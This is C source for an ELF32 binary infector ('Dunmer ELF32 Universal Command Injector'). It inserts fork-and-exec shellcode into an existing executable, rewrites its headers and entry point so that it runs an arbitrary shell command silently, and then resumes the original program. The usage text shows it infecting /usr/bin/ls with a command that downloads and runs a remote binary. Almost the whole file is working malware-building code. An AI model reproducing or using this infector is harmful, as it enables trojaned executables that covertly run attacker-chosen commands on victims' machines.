/*
 * Dunmer ELF32 Universal Command Injector
 *
 * Copyright of Simone 'evilsocket' Margaritelli.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 */

#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <elf.h>

typedef struct {
  char srcfile[0xFF];
  char dstfile[0xFF];
  char command[0xFF];
  int  verbose;
}
params_t;

extern int errno;

void injector_banner     ();
void injector_usage      ( char *argvz );
void inject_elf_code     ( char *sourcefile, char *infectedfile, char *asm_payload, int asm_len, int asm_reentry_offset );
int  find_reentry_offset ( char *code, int size );
void dump_hex            ( char *buff, int offset, int n );

int main(int argc,char **argv)
{
  int i;
  injector_banner();

  if( argc < 6 ){
    injector_usage(strdup(argv[0]));
    return -1;
  }

  params_t params;

  memset( &params, 0, sizeof(params) );

  int c;
  while( (c = getopt(argc,argv,"s:d:c:")) != -1 ){
    switch(c){
      case 's' : strncpy( params.srcfile ,optarg, 0xFF ); break;
      case 'd' : strncpy( params.dstfile ,optarg, 0xFF ); break;
      case 'c' : strncpy( params.command ,optarg, 0xFF ); break;
      default  : injector_usage(strdup(argv[0]));         return -1;
    }
  }

  /* General purpose shell code that simulates :
   *
   *              fork()
   *              if( child_process ){
   *                      system( 'command' )
   *              }
   *
   * by BlackLight
   */
  unsigned char asm_base_payload[] =
    "\x60"                       /*pusha*/

    /* fork */
    "\xb8\x02\x00\x00\x00"       /*mov    $0x2,%eax*/
    "\xcd\x80"                   /*int    $0x80*/
    "\x83\xf8\x00"               /*cmp    $0x0,%eax*/
    "\x75\x25"                   /*jne   80483a6 <end>*/

    /* child process: execl ("/bin/sh","-c",cmd); */
    "\xb8\x0b\x00\x00\x00"       /*mov    $0xb,%eax*/
    "\x31\xd2"                   /*xor    %edx,%edx*/
    "\x52"                       /*push   %edx*/
    "\x68\x6e\x2f\x73\x68"       /*push   $0x68732f6e*/
    "\x68\x2f\x2f\x62\x69"       /*push   $0x69622f2f*/
    "\x89\xe3"                   /*mov    %esp,%ebx*/
    "\x52"                       /*push   %edx*/
    "\x68\x2d\x63\x63\x63"       /*push   $0x6363632d*/
    "\x89\xe1"                   /*mov    %esp,%ecx*/
    "\x52"                       /*push   %edx*/
    "\xeb\x22"                   /*jmp   80483c2 <cmd>*/
    "\x51"                       /*push   %ecx*/
    "\x53"                       /*push   %ebx*/
    "\x89\xe1"                   /*mov    %esp,%ecx*/
    "\xcd\x80"                   /*int    $0x80*/

    /* parent process: waitpid (-1,NULL,0); */
    "\x31\xd2"                   /*xor    %edx,%edx*/
    "\xb8\x07\x00\x00\x00"       /*mov    $0x7,%eax*/
    "\xbb\xff\xff\xff\xff"       /*mov    $0xffffffff,%ebx*/
    "\x52"                       /*push   %edx*/
    "\x89\xe1"                   /*mov    %esp,%ecx*/
    "\xcd\x80"                   /*int    $0x80*/
    "\x83\xc4\x04"               /*add    $0x4,%esp*/

    /* this prepares the overwriting by the address of entry point */
    "\x61"                       /*popa*/
    "\xbd\x00\x00\x00\x00"       /*mov    $0x0,%ebp*/
    "\xff\xe5"                   /*jmp    *%ebp*/

    /* string label; here the command will be appended */
    "\xe8\xd9\xff\xff\xff"       /*call  80483a0 <l1>*/;

  int   cmd_len     = strlen(params.command),
        base_size   = sizeof(asm_base_payload) - 1;

  /* alloc space for base shellcode + user command */
  char *asm_payload = (char *)malloc( base_size + cmd_len );

  /* asm_payload = asm_base_payload + params.command */
  memcpy( asm_payload, asm_base_payload, base_size );
  memcpy( asm_payload + base_size, params.command, cmd_len );

  /* compute total payload size and 'jmp <original_elf_entrypoint>' shellcode offset */
  int  asm_payload_size   = base_size + cmd_len,
       asm_reentry_offset = find_reentry_offset( asm_payload, asm_payload_size );

  printf( "@ Shellcode size               : %d bytes .\n", asm_payload_size );

  /* do injection */
  inject_elf_code( params.srcfile, params.dstfile, asm_payload, asm_payload_size, asm_reentry_offset );

  return 0;
}

void injector_banner(){
  printf( "************************************************************\n"
      "*        -[ Dunmer ELF32 Universal Command Injector ]-        *\n"
      "************************************************************\n\n" );
}

void injector_usage( char *argvz ){
  printf( "Usage : %s -s <sourcefile> -d <destinationfile> -c <command>\n", argvz );
  printf( "\tOptions : \n" );
  printf( "\t\t-s <sourcefile>      : file to infect with the arbitrary command .\n" );
  printf( "\t\t-d <destinationfile> : destination file name for infection .\n" );
  printf( "\t\t-c <command>         : shell command to inject .\n\n" );

  printf( "\tExample : \n" );
  printf( "\t\t%s -s /usr/bin/ls -d ./ls_infected -c \"wget http://www.site.com/binary && chmod +x binary && ./binary\" \n\n", argvz );

}

void die( int line ){
  printf( "ERROR : line %d : %s\n", line, strerror(errno) );
  exit(EXIT_FAILURE);
}

/*      This function searches for 'mov ebp,0 - jmp ebp' into shellcode payload */
int find_reentry_offset( char *code, int size ){
  char pattern[] = "\xbd\x00\x00\x00\x00\xff\xe5"; /* mov ebp,0 - jmp ebp */
  int  offset,
       pattern_size = 7,
       end_offset   = size - pattern_size;

  for( offset = 0; offset < end_offset; offset++ ){
    if( memcmp( &code[offset], pattern, pattern_size ) == 0 ){
      return offset + 1;
    }
  }

  return -1;
}

void dump_hex( char *buff, int offset, int n ){
  int i;
  for( i = offset; i < offset + n; i++ ){
    if( isprint((unsigned char)buff[i]) ){
      printf( "%.2c ", (unsigned char)buff[i] );
    }
    else{
      printf( "0x%.2X ", (unsigned char)buff[i] );
    }

    if( (i % 5) == 0 ){ printf( "\n" ); }
  }
}

/* main injection routine :
 *
 *      sourcefile         : original elf file name .
 *  infectedfile       : destination file name .
 *  asm_payload        : shellcode to inject .
 *  asm_reentry_offset : offset of 'mov ebp,0 - jmp ebp' into shellcode (it's going to be patched) .
 */
void inject_elf_code( char *sourcefile, char *infectedfile, char *asm_payload, int asm_len, int asm_reentry_offset ){
  unsigned int    srcsize;
  unsigned char * srcbuffer;

  Elf32_Ehdr *elf_header;
  Elf32_Phdr *program_headers;
  Elf32_Shdr *section_headers;

  struct stat stat;

  int         i_fd, i,
              move = 0,
              parasite_offset,
              bss_len,
              o_fd,
              zero=0;

  if( (i_fd = open( sourcefile, O_RDWR )) == -1 ){
    die( __LINE__ );
  }

  if( fstat( i_fd, &stat ) < 0 ){
    die( __LINE__ );
  }

  srcsize = stat.st_size;

  printf( "@ Original file size           : %d bytes .\n", srcsize );

  /* read original file into a buffer */
  srcbuffer = (unsigned char *)malloc(srcsize);

  if( read( i_fd, srcbuffer, srcsize ) != srcsize ){
    die( __LINE__ );
  }

  close(i_fd);

  elf_header = (Elf32_Ehdr *)srcbuffer;

  /* Here we are going to take original elf entry point offset to
   * patch shellcode, so that :
   *
   *      'mov ebp,0 - jmp ebp'
   *
   * will become :
   *
   *  'mov ebp,<entry_point> - jmp ebp'
   *
   * to jump at the original elf code .
   */
  printf( "@ Old entry point              : 0x%X .\n", elf_header->e_entry );

  printf( "@ Patching shellcode at offset : 0x%X ( ", asm_reentry_offset );
  dump_hex( asm_payload, asm_reentry_offset, 4 );
  printf( "-> " );

  *(int*)&asm_payload[asm_reentry_offset] = elf_header->e_entry;
  dump_hex( asm_payload, asm_reentry_offset, 4 );
  printf( ") .\n" );

  /* compute new elf header info and data for headers relocation */
  program_headers = (Elf32_Phdr *)(srcbuffer + elf_header->e_phoff);
  for( i = 0; i < elf_header->e_phnum; i++ ){
    if( program_headers->p_type != PT_DYNAMIC ){
      if( program_headers->p_type == PT_LOAD && program_headers->p_offset ){
        parasite_offset     = program_headers->p_offset + program_headers->p_filesz;
        elf_header->e_entry = program_headers->p_memsz  + program_headers->p_vaddr;
        bss_len             = program_headers->p_memsz  - program_headers->p_filesz;
        break;
      }
    }
    ++program_headers;
  }

  printf( "@ New entry point              : 0x%X .\n", elf_header->e_entry );

  /* update elf section headers */
  section_headers = (Elf32_Shdr *)(srcbuffer + elf_header->e_shoff);
  for( i = 0; i < elf_header->e_shnum; i++ ){
    if( section_headers->sh_offset >= parasite_offset ){
      section_headers->sh_offset += asm_len + bss_len;
    }
    ++section_headers;
  }

  /* update elf program headers */
  program_headers = (Elf32_Phdr *)(srcbuffer + elf_header->e_phoff);
  for( i = 0; i < elf_header->e_phnum; i++ ){
    if( program_headers->p_type != PT_DYNAMIC ){
      if(move){
        program_headers->p_offset += asm_len + bss_len;
      }
      else if( program_headers->p_type == PT_LOAD && program_headers->p_offset ){
        program_headers->p_filesz += asm_len + bss_len;
        program_headers->p_memsz  += asm_len + bss_len;
        move = 1;
      }
    }
    ++program_headers;
  }

  /* update elf header with new parasite code offset and write relocated data to the destination file */
  elf_header->e_shoff += (elf_header->e_shoff >= parasite_offset ? asm_len + bss_len : 0);
  elf_header->e_phoff += (elf_header->e_phoff >= parasite_offset ? asm_len + bss_len : 0);

  printf( "@ Creating infected file       : '%s' .\n", infectedfile );

  if( (o_fd = open( infectedfile, O_WRONLY|O_CREAT|O_EXCL, stat.st_mode )) < 0 ){
    die( __LINE__ );
  }

  if( write( o_fd, srcbuffer, parasite_offset ) < 0 ){
    die( __LINE__ );
  }

  for( i = 0; i < bss_len; i++ ){
    write( o_fd, &zero, 1 );
  }

  if( write( o_fd, asm_payload, asm_len ) < 0 ){
    die( __LINE__ );
  }

  if( write( o_fd, srcbuffer + parasite_offset, stat.st_size - parasite_offset ) < 0 ){
    die( __LINE__ );
  }

  close(o_fd);

  free(srcbuffer);
}
